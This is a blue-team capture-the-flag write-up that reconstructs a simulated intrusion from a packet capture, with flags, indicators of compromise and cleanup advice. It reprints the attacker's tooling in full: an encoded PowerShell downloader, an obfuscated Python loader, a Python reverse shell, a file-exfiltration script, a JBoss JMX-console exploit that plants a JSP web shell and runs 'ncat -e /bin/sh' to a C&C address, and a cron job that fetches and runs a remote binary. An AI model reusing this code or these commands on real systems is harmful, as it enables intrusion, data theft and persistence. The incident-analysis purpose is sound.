@@ -1,0 +1,621 @@
+This writeup is from a Blueteam perspective
+
+The inital vector for the attacker is the endpoint: 10.0.2.6
+This machine accessed following addresses:
+financial-news.dynu.net / 46.101.103.248
+drobbox-api.dynu.com A 46.101.103.248
+which are part of the attacker infrastructure, either the whole server or it is a legit server compromised by the attacker.
+
+Initial malware is believed to be in document, downloaded by 10.0.2.6:
+financial-news.dynu.net/shocking_financial_data.docm
+
+On further analysis of the document it is confirmed that it does indeed contain a macro to execute powershell with encoded commands. (Good SIEM alert is encoded commands in powershell, there are not so many FPs with this. Depending on the company though.)
+The macro will execute following command on powershell (command decoded for your convenience):
+powershell -NoP -NonI -W Hidden -Exec Bypass -Enc
+if ((Get-Date).Ticks -lt (Get-Date -Date '18-jan-2017 00:00:00').Ticks) {(New-Object System.Net.WebClient).DownloadFile('http://drobbox-api.dynu.com/update',"$env:temp\update");Start-Process pythonw.exe "$env:temp\update 31337"};#NIXU17{pow3r_t0_the_sh3lls}
+
+Flag found: NIXU17{pow3r_t0_the_sh3lls}
+
+When the unfortunate enduser opened the document and enabled macros, the powershell connected to the second domain:
+drobbox-api.dynu.com
+and downloaded the following file: drobbox-api.dynu.com/update
+
+UPDATE
+---------------------------------------------------------
+#!/usr/bin/env python
+from itertools import cycle, izip
+import base64, sys
+import socket, subprocess, os, urllib
+x = lambda a, b: ''.join(chr(ord(c)^ord(k)) for c,k in izip(base64.decodestring(a), cycle(b)))
+c = """
+EBF9em9mAARICEAAW0doVwVWQWhGAUpsWVJSTjleXkFcQUMTQlxQXFZFHxNERlNDQVhQVEBAGxNe
+QB8XRkNfX15ROzl7eGBlEw4XEQALCxkCBwUdBgUGHQIDAhM5Y3hhZRMOFwUHBQU9OUJbVltfEQ4T
+W1JcUVdWCRERaBJAbBMXFxERFhNER0MbXEQdVlZHVERVGxoeOUkTDhdfUF5RU1IRVwkXERMdWVha
+XxtoVFtDG1xFVxlLGhdtEQNLAVYYE1VYQRFLE15dEVduHjk7QBMKE0JcUFxWRR1AWFBaVkcfQF5Q
+WFJHH3J1aHp/dmcbE0JcUFxWRR1geHB6bGBjYXRyfh45Qh1QWF1fVlBDGxl7fGRnHRNjeGFlGho9
+QB9AVllXGUsbRFtUX18fGhgaOT1EWVpfUhNlQUZSCTsTExcTUl5XFw4RSxtEHUNWUEEbAAMBAxoY
+ORMXExFBVkRGXUcTChMTETkXExETWlETUl5XFw4MExFGRlhHEQ0TU0FWVlg7ExMXE1RfWlETUl5X
+GUBFUkFDQEZaR18bE1BXFxEYCTkXExETExcTEUdBTgk7ExMXExETExcTERMTWEAfUFtTWkMbUFpX
+agAJaho7ExMXExETExdWSVBWR0cLORMXExETExcTERMTF0FUQEZbRxEOExV9XhNAQlBZE1VeX1QT
+XEUTVVpBUlBFXEFOEm1dET0TERMTUl9YVRNUXlUdQENSQ0dAQFpFWxsVVFRHExUaCzkTFxMRExMX
+E0VBSg05ERMTFxMRExMXExETRkVfXVpRGWZjf1xHVl9WQR8aH0FWQ0FYVkVSG1JeV2wHC24fF1xC
+HUNWR1kdUVZAVF1SWlYZUF5TaAUJbh4aOxMTFxMRExMXVklQVkdHEXZLVFZBR1pYXRFSQBdWCzkT
+FxMRExMXExETExdBVEBGW0cRDhNER0MbVh4TGhMRa10TORMXExFWX15VEVBeUx1CR1JFR0JEWkNb
+GRFWT1ZSExEeCTsTExcTERMTF0RYR1sXXEFWXR8UVEtWVB1FS0cQHxEURBAaEVJAF1ULORMXExET
+ExcTERMTF0BEUUNFXFJWQEQdUlJfWxtSXldsBgtuHxdARVdcQkcMVR8XQEVXVkVBDFUaPRMRExMX
+ExETQVJARF9HFw4REXZPVlJGR1JXHxN8QkdBRkcXWl8TVk9WUh1HT0dtXRE9ExETE1JfQlYJPRMR
+ExMXExETQ0VcUhMOF0BEUUNFXFJWQEQdYVxDUl0ZORMXExETExcTERMTFxMRExNUXlUfORcTERMT
+FxMRExMXExETExdAWVZfWw5lQUZSHzsTExcTERMTFxMRExMXExETQENXXkZHCkBEUUNFXFJWQEQd
+YXpjch87ExMXExETExcTERMTFxMRE0BDV1RBQQpARFFDRVxSVkBEHWF6Y3IfOxMTFxMRExMXExET
+ExcTERNAQ1dYXQ5ERlNDQVhQVEBAGWN4Y3YeORETExcTERMTRVZCRl9DEwwTQ0VcUh1AQ1deRkcZ
+QVRSVx8aERgTR0FeUB1ER1VWQUUdQ1ZSUxsYORMXExFAHURWX1cbTxtDVkBCX0UTGBdAWVZfWxsY
+Gho9QB9QX1hAVBsaPQ==
+"""
+exec(x(c, sys.argv[1]))
+---------------------------------------------------------
+
+Quick Base64 decode does not give anything for it, it is "encrypted" for obfuscation from NIDS/NIPS but since we have the downloader in plain text, we also got the decryption key which is the first argument in the call: 31337
+I decrypted the text using the original code but modifying the end not to execute but to print.
+
+This reveals us the next payload:
+
+New Flag! NIXU17{?s1ht_d4er_u0y_nac}
+---------------------------------------------------------
+# NIXU17{?s1ht_d4er_u0y_nac}
+import socket, subprocess, os, urllib
+
+HOST = "188.166.167.141"
+PORT = 6666
+
+shell = lambda: "[%s] $ " % str(os.getcwd())
+x = lambda d: "".join([chr(ord(x) ^ 0x6e) for x in d])
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.send(x(shell()))
+
+while True:
+    cmd = x(s.recv(1024))
+    result = ""
+    if cmd == "quit": break
+    elif cmd.startswith("cd "):
+        try:
+            os.chdir(cmd[3:])
+        except:
+            result = "No such file or directory!\n"
+    elif cmd.startswith("get "):
+        try:
+            urllib.URLopener().retrieve(cmd[4:], os.path.basename(cmd[4:]))
+        except Exception as e:
+            result = str(e) + "\n"
+    elif cmd.startswith("exec "):
+        with open('exec.txt', 'w') as f:
+            subprocess.call(cmd[5:], stdout=f, stderr=f)
+        result = "Executed. Output in exec.txt\n"
+    else:
+        proc = subprocess.Popen(
+                cmd,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE)
+        result = proc.stdout.read() + proc.stderr.read()
+    s.send(x(result + shell()))
+s.close()
+---------------------------------------------------------
+
+This is a reverse shell back to the C&C server to port 6666.
+They implement basic obfuscation on malware and also to the C&C traffic but decrypting is trivial. PKI would be much better (;
+
+I created the following small piece of code and saved all CC traffic into the CC_traffic.txt file from the pcap.
+Looks like I had little mistake at some point along the way converting around, all of my C letters turned into D letters and also N letters went missing.
+We will go with it, I have manually fixed where needed.
+
+x = lambda d: "".join([chr(ord(x) ^ 0x6e) for x in d])
+with open("CC_traffic.txt") as f:
+    content = f.readlines()
+    for line in content:
+        print(x(line))
+
+I will not paste the CC traffic here because its pretty big list, it is in a separate file.
+Concluding from the CC traffic, the attacker is doing basic reconnaissance first and then sets up a persistence at:
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run Notepad REG_SZ    C:\python27\pythonw.exe C:\Users\ROBERT~1\AppData\Local\Temp\update
+This will launch the currently running backdoor.
+
+After the persistence is setup the attacker is searching for juicy artifacts to steal around the endpoint.
+
+After searching couple of places the attacker echoes in vain of the poor crypto he has implemented in CC traffic:
+NIXU17{poor_cryp7o_1s_p0or}
+
+They decide to continue with what they have found so far. They download an exfiltration tool to the local machine
+get http://drobbox-api.dynu.com/backup
+
+BACKUP
+---------------------------------------------------------
+#!/usr/bin/python
+
+import sys
+import base64
+import urllib2
+
+def read_file(x):
+        with open(x, "rb") as f:
+                bytes = f.read()
+                return base64.b64encode(bytes)
+
+file = str(sys.argv[1])
+encoded = read_file(file)
+req = urllib2.Request("http://faxbook.ddnsfree.com:6969")
+req.add_header("User-Agent", "EXFIL")
+req.add_header("Filename", file)
+req.add_header("File", encoded)
+resp = urllib2.urlopen(req)
+print resp.read()
+---------------------------------------------------------
+
+We can see the download in the pcap aswell.
+After the file is downloaded, the attacker exfils following files using this new backup tool:
+
+python backup interim_report_III_2016.pdf
+python backup year_2016_report.pdf
+
+These files can be recovered from the pcap and the value of them can be then assessed.
+After exfiltration is complete the attacker continues with reco of the internal network.
+At this point he is able to see bunch of other machines in the network, however he wants to see more detailed information of the other machines.
+Attacker will download an additional port scanning tool:
+get http://drobbox-api.dyun.com/search
+
+SEARCH
+---------------------------------------------------------
+#!/usr/bin/python
+import urllib2, sys, socket
+
+ports = [20,21,22,23,25,53,69,123,137,161,162,110,80,8080,1025,587,1433,
+         2082,2483,3128,3306,4333,5432,5500]
+
+
+def iprint(n, msg):
+    lines = msg.split("\n")
+    for line in lines:
+        print(" " * n + line)
+
+
+def check(host, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host,port))
+        iprint(4, str(port) + ": open")
+        if port in [80,8080]:
+            response = urllib2.urlopen("http://%s:%s" % (str(host),str(port)))
+            iprint(8, "".join(response.info().headers))
+            iprint(8, response.read())
+        else:
+            iprint(8, s.recv(1024))
+    except Exception, e:
+        iprint(4, str(port) + ": closed")
+    finally:
+        s.close()
+
+
+hosts = sys.argv[1].split(",")
+socket.setdefaulttimeout(5)
+
+for host in hosts:
+    print("HOST: " + host)
+    for port in ports:
+        check(host, port)
+    print("")
+---------------------------------------------------------
+
+Attacker will then proceed to run the portscan against three more machines:
+python search 10.0.2.5,10.0.2.7,10.0.2.15 > ports.txt
+
+And upload the results back home for further analysis.
+python backup ports.txt
+
+The result of the portscan:
+---------------------------------------------------------
+HOST: 10.0.2.5
+    20: closed
+    21: closed
+    22: closed
+    23: closed
+    25: closed
+    53: closed
+    69: closed
+    123: closed
+    137: closed
+    161: closed
+    162: closed
+    110: closed
+    80: closed
+    8080: closed
+    1025: closed
+    587: closed
+    1433: closed
+    2082: closed
+    2483: closed
+    3128: closed
+    3306: closed
+    4333: closed
+    5432: closed
+    5500: closed
+
+HOST: 10.0.2.7
+    20: closed
+    21: closed
+    22: open
+        SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1
+
+
+    23: closed
+    25: closed
+    53: closed
+    69: closed
+    123: closed
+    137: closed
+    161: closed
+    162: closed
+    110: closed
+    80: open
+        Date: Mon, 16 Jan 2017 23:40:40 GMT
+
+        Server: Apache/2.2.22 (Ubuntu)
+
+        Last-Modified: Thu, 12 Jan 2017 17:33:24 GMT
+
+        ETag: "88a6-9c-545e91d44ef9a"
+
+        Accept-Ranges: bytes
+
+        Content-Length: 156
+
+        Vary: Accept-Encoding
+
+        Connection: close
+
+        Content-Type: text/html
+
+
+        <html><body>
+        <h1>Financial data server</h1>
+        <p>This server contains internal financial data.</p>
+        <p>Access to this data is confidential.</p>
+        </body></html>
+
+    8080: open
+        Server: Apache-Coyote/1.1
+
+        X-Powered-By: Servlet 2.5; JBoss-5.0/JBossWeb-2.1
+
+        Accept-Ranges: bytes
+
+        ETag: W/"1748-1484609233000"
+
+        Last-Modified: Mon, 16 Jan 2017 23:27:13 GMT
+
+        Content-Type: text/html
+
+        Content-Length: 1748
+
+        Date: Mon, 16 Jan 2017 23:40:40 GMT
+
+        Connection: close
+
+
+        <?xml version="1.0" encoding="iso-8859-1"?>
+        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+        <html xmlns="http://www.w3.org/1999/xhtml">
+        <head>
+           <title>Welcome to JBoss AS</title>
+           <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+           <link rel="StyleSheet" href="css/jboss.css" type="text/css"/>
+        </head>
+
+        <body>
+        <!-- header begin -->
+           <a href="http://www.jboss.org/">
+              <img src="images/logo.gif" alt="JBoss" id="logo" width="226" height="105" />
+           </a>
+           <div id="header">&nbsp;</div>
+           <div id="navigation_bar"></div>
+        <!-- header end -->
+
+           <h3>Manage this JBoss AS Instance</h3>
+           <ul>
+              <li><a href="/admin-console/">Administration Console</a></li>
+              <li><a href="/jmx-console/">JMX Console</a></li>
+              <li><a href="/web-console/">JBoss Web Console</a></li>
+              <li><a href="/status">Tomcat status</a>
+                  <a href="/status?full=true">(full)</a>
+                  <a href="/status?XML=true">(XML)</a></li>
+           </ul>
+
+           <h3>JBoss AS Online Resources</h3>
+           <ul>
+              <li><a href="http://www.jboss.org/jbossas/docs/">JBoss AS Documentation</a></li>
+              <li><a href="http://wiki.jboss.org/">JBoss Wiki</a></li>
+              <li><a href="http://jira.jboss.org/jira/browse/JBAS">JBoss AS JIRA</a></li>
+              <li><a href="http://www.jboss.org/index.html?module=bb">JBoss Forums</a></li>
+              <li><a href="https://lists.jboss.org/">JBoss Mailing Lists</a></li>
+           </ul>
+
+        <!-- footer begin -->
+           <div id="footer">
+              <div id="credits">
+                 <a href="http://www.jboss.org/jbossas/">JBoss Application Server</a>
+              </div>
+              <div id="footer_bar">&nbsp;</div>
+           </div>
+        <!-- footer end -->
+        </body>
+
+        </html>
+
+    1025: closed
+    587: closed
+    1433: closed
+    2082: closed
+    2483: closed
+    3128: closed
+    3306: closed
+    4333: closed
+    5432: closed
+    5500: closed
+
+HOST: 10.0.2.15
+    20: closed
+    21: closed
+    22: closed
+    23: closed
+    25: closed
+    53: closed
+    69: closed
+    123: closed
+    137: closed
+    161: closed
+    162: closed
+    110: closed
+    80: closed
+    8080: closed
+    1025: closed
+    587: closed
+    1433: closed
+    2082: closed
+    2483: closed
+    3128: closed
+    3306: closed
+    4333: closed
+    5432: closed
+    5500: closed
+---------------------------------------------------------
+Looking at the portscan, the webserver looks like a juicy target for the attacker to attack.
+At this point I expect future action to be targeted at the webserver.
+The webserver has three open ports:
+22
+80
+8080
+Looks like the webserver OS version is old and possibly there are publicly available vulnerabilities.
+Looks like the webserver Apache version is old and on a quick look, there is a list of vulnerabilities for this version.
+There is also a JBoss application server running on 8080.
+X-Powered-By: Servlet 2.5; JBoss-5.0/JBossWeb-2.1
+
+After the portscan, attacker will download additional file and execute it:
+get http://drobbox-api.dyun.com/java
+python java
+
+---------------------------------------------------------
+# coding: utf-8
+# Based on JexBoss script.
+#
+# Info from the original:
+# JexBoss v1.0. @autor: Jo..o Filho Matos Figueiredo (joaomatosf@gmail.com)
+# Updates: https://github.com/joaomatosf/jexboss
+
+import httplib, urllib, time
+
+
+HOST = "10.0.2.7"
+PORT = 8080
+
+
+def getConnection():
+    return httplib.HTTPConnection(HOST, PORT)
+
+
+def shell():
+    path = "/jbossass/jbossass.jsp?"
+    headers = {"User-Agent" : "4tt4ck"}
+    conn = getConnection()
+    cmd = urllib.urlencode({"cmd": "ncat -e /bin/sh 188.166.167.141 6667"})
+    conn.request("GET", path + cmd, "", headers)
+    conn.close()
+
+
+def exploit():
+    jsp = ("%3c%25%40%20%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e"
+           "%75%74%69%6c%2e%2a%2c%6a%61%76%61%2e%69%6f%2e%2a%22%25%3e%3c%70%72"
+           "%65%3e%3c%25%20%69%66%20%28%72%65%71%75%65%73%74%2e%67%65%74%50%61"
+           "%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%20%21%3d%20%6e%75%6c%6c"
+           "%29%20%7b%20%50%72%6f%63%65%73%73%20%70%20%3d%20%52%75%6e%74%69%6d"
+           "%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65"
+           "%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d"
+           "%64%22%29%29%3b%20%44%61%74%61%49%6e%70%75%74%53%74%72%65%61%6d%20"
+           "%64%69%73%20%3d%20%6e%65%77%20%44%61%74%61%49%6e%70%75%74%53%74%72"
+           "%65%61%6d%28%70%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29"
+           "%29%3b%20%53%74%72%69%6e%67%20%64%69%73%72%20%3d%20%64%69%73%2e%72"
+           "%65%61%64%4c%69%6e%65%28%29%3b%20%77%68%69%6c%65%20%28%20%64%69%73"
+           "%72%20%21%3d%20%6e%75%6c%6c%20%29%20%7b%20%6f%75%74%2e%70%72%69%6e"
+           "%74%6c%6e%28%64%69%73%72%29%3b%20%64%69%73%72%20%3d%20%64%69%73%2e"
+           "%72%65%61%64%4c%69%6e%65%28%29%3b%20%7d%20%7d%25%3e%3c%25%2d%2d%20"
+           "%4e%49%58%55%31%37%7b%68%30%77%5f%74%68%65%5f%68%65%78%5f%64%31%64"
+           "%5f%79%6f%75%5f%66%31%6e%64%5f%6d%33%3f%7d%20%2d%2d%25%3e")
+
+    payload = ("/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admi"
+               "n:service=DeploymentFileRepository&methodName=store&argType=ja"
+               "va.lang.String&arg0=jbossass.war&argType=java.lang.String&arg1"
+               "=jbossass&argType=java.lang.String&arg2=.jsp&argType=java.lang"
+               ".String&arg3=" + jsp + "&argType=boolean&arg4=True")
+
+    conn = getConnection()
+    conn.request("HEAD", payload)
+    conn.close()
+    time.sleep(10)
+    shell()
+
+
+exploit()
+---------------------------------------------------------
+
+This is a publicly available pentest tool for JBoss: JexBoss
+This particular script will exploit JBoss and send a reverse shell back to the CC: 188.166.167.141:6667 from the JBoss server.
+The jsp in exploit function is URL encoded and upon decoding, reveals a new flag for us: NIXU17{h0w_the_hex_d1d_you_f1nd_m3?}
+Exploit traffic from pcap:
+
+---------------------------------------------------------
+HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=jbossass.war&argType=java.lang.String&arg1=jbossass&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3c%25%40%20%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%75%74%69%6c%2e%2a%2c%6a%61%76%61%2e%69%6f%2e%2a%22%25%3e%3c%70%72%65%3e%3c%25%20%69%66%20%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%20%21%3d%20%6e%75%6c%6c%29%20%7b%20%50%72%6f%63%65%73%73%20%70%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%29%3b%20%44%61%74%61%49%6e%70%75%74%53%74%72%65%61%6d%20%64%69%73%20%3d%20%6e%65%77%20%44%61%74%61%49%6e%70%75%74%53%74%72%65%61%6d%28%70%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%3b%20%53%74%72%69%6e%67%20%64%69%73%72%20%3d%20%64%69%73%2e%72%65%61%64%4c%69%6e%65%28%29%3b%20%77%68%69%6c%65%20%28%20%64%69%73%72%20%21%3d%20%6e%75%6c%6c%20%29%20%7b%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%64%69%73%72%29%3b%20%64%69%73%72%20%3d%20%64%69%73%2e%72%65%61%64%4c%69%6e%65%28%29%3b%20%7d%20%7d%25%3e%3c%25%2d%2d%20%4e%49%58%55%31%37%7b%68%30%77%5f%74%68%65%5f%68%65%78%5f%64%31%64%5f%79%6f%75%5f%66%31%6e%64%5f%6d%33%3f%7d%20%2d%2d%25%3e&argType=boolean&arg4=True HTTP/1.1
+Host: 10.0.2.7:8080
+Accept-Encoding: identity
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+X-Powered-By: Servlet 2.5; JBoss-5.0/JBossWeb-2.1
+Set-Cookie: JSESSIONID=B94C8F3E47559A67CD54E225E5E05D8D; Path=/jmx-console
+Content-Type: text/html
+Content-Length: 1817
+Date: Mon, 16 Jan 2017 23:43:24 GMT
+---------------------------------------------------------
+GET /jbossass/jbossass.jsp?cmd=ncat+-e+%2Fbin%2Fsh+188.166.167.141+6667 HTTP/1.1
+Host: 10.0.2.7:8080
+Accept-Encoding: identity
+Content-Length: 0
+User-Agent: 4tt4ck
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+X-Powered-By: Servlet 2.5; JBoss-5.0/JBossWeb-2.1
+Set-Cookie: JSESSIONID=62311C1FA08AF8EBD3BFCDAFC229AC8D; Path=/jbossass
+Content-Type: text/html;charset=ISO-8859-1
+Content-Length: 5
+Date: Mon, 16 Jan 2017 23:44:32 GMT
+
+<pre>HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+X-Powered-By: Servlet 2.5; JBoss-5.0/JBossWeb-2.1
+Set-Cookie: JSESSIONID=62311C1FA08AF8EBD3BFCDAFC229AC8D; Path=/jbossass
+Content-Type: text/html;charset=ISO-8859-1
+Content-Length: 5
+Date: Mon, 16 Jan 2017 23:44:32 GMT
+
+<pre>
+---------------------------------------------------------
+
+After the attacker has moved laterally to the juicy webserver, they are starting to wrap up things at current machine and remove extra traces:
+del backup exec.txt java ports.txt search
+And then quit the current connection.
+
+At this point we assume that they will continue in the webserver so we will search it in the pcap and check any CC traffic and decrypt if needed.
+The attacker continues with shell open into the webserver, he looks to the skies and lets out a loong sight as the encryption is nonexisting.
+
+---------------------------------------------------------
+whoami
+root
+
+--The attacker fills with joy as he has now root access to the server.
+
+pwd
+/usr/local/share
+
+ls
+ca-certificates
+fonts
+jboss
+jboss_old
+jboss_orig
+man
+profile.xml
+sgml
+xml
+
+ls /home
+admin
+bob
+cosmo
+joey
+marty
+matson
+robert
+
+cd /home/robert
+
+ls
+cat.jpg
+confidential
+hours.txt
+reports
+todo.txt
+
+ls confidential
+acquisition_report.pdf
+business_plan.pdf
+service_proposal.pdf
+
+--Looks like the attacker has found what he was searching for. Those sweet secret plans, Yay! Time to exfil them with the same previous tool.
+
+wget http://drobbox-api.dynu.com/backup -P /tmp
+
+zip -P s3cr3t -r /tmp/files.zip confidential
+  adding: confidential/ (stored 0%)
+  adding: confidential/service_proposal.pdf (deflated 8%)
+  adding: confidential/acquisition_report.pdf (deflated 23%)
+  adding: confidential/business_plan.pdf (deflated 19%)
+
+cd /tmp
+
+--Zip all the confidental files up and exfil
+
+python backup files.zip
+<html><body><h1>ACK</h1></body></html>
+
+--At this point the attacker decides to setup a download on the webserver, this will download the X file, execute it and remove once a month.
+
+(crontab -l 2>/dev/null; echo "* * 1 * * cd /tmp;wget http://drobbox-api.dynu.com/x;chmod +x x;./x;shred -u x") | crontab -
+exit
+---------------------------------------------------------
+
+The attacker closed the connection, and no more traffic is seen on pcap.
+
+Conclusion:
+
+The attacker used a macro document to gain access to first endpoint: 10.0.2.6
+The attacker exfiltrated valuable information and setup a persistence.
+Attacker proceeded to recon the local network for more high value targets.
+Attacker exploited an application server 10.0.2.7 and moved laterally.
+On the exploited server, attacker setup possibly a persistence and exfiltrated valuable information.
+
+Overall funny nice task, a lot of information can be found from a packet capture. Pretty straightforward, I was expecting more tricks.
+
+Advice:
+Cleanup persistence from machine 10.0.2.6
+Evaluate the value of exfiltered data.
+Try to obtain a copy of the file http://drobbox-api.dynu.com/x and further investigate what this does and act accordingly.
+Evaluate the value of files inside the .zip file.
+Cleanup Cronjob from 10.0.2.7 / other option is to completely rebuild this server with latest software. Updates need to be done anyways.
+Educate the enduser in question (or all of them for that matter).
+
+Useful signatures for the incident:
+User-Agent "EXFIL"
+faxbook.ddnsfree.com
+financial-news.dynu.net
+drobbox-api.dynu.com
+46.101.103.248
+filehash of backup, update, search, x, java,
+
+Flags (6):
+NIXU17{pow3r_t0_the_sh3lls} - from downloader
+NIXU17{?s1ht_d4er_u0y_nac} - from downloaded payload
+NIXU17{poor_cryp7o_1s_p0or} - from poorly encrypted CC traffic
+NIXU17{h0w_the_hex_d1d_you_f1nd_m3?} - from the Jexboss script.
+NIXU17{n0t just a TPS r3port} - from exfiltrated year report
+NIXU17{inf1ltrat3_to_3xfil7rate} - Inside the encrypted zip file. acquisition_report.pdf
